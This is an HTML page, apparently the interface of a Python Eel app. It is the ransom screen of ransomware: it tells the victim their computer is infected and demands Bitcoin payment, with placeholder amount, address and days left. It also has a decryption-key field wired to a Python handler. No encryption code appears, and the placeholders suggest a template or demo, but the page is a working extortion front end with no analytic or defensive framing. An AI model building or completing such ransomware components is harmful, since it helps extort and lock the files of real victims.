<!doctype html>
<html>

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <script type="text/javascript" src="/eel.js"></script>

  <style>
    .mainContainer {
      min-height: 600px;
      height: 100vh;
      display: flex;
      flex-direction: column;
    }

    .container {
      display: flex;
      flex-direction: row;
    }

    .left {
      display: flex;
      border: 1px solid purple;
    }

    .right {
      display: flex;
      border: 1px solid black;
    }
  </style>
</head>

<body>
  <div class="mainContainer">
    <div class="container">

      <div class="left">
        <div>
          Your computer has been infected with ransomware
        </div>
      </div>

      <div class="right">
        Pay USD$x,xxx in Bitcoin to the address btc-xxxx to decrypt your files
        You have xxx days left
      </div>
    </div>
    <div class="container">
      <div class="bottom">
        <input type="text" id="textbox" placeholder="decryption key">
        <button onclick="getValue()">Decrypt Files</button>
        <script>
          function getValue() {
            var textboxValue = document.getElementById('textbox').value;
            eel.handleButtonPress(textboxValue); // Call Python function with textbox value
          }
        </script>
      </div>
    </div>
  </div>
</body>

</html>
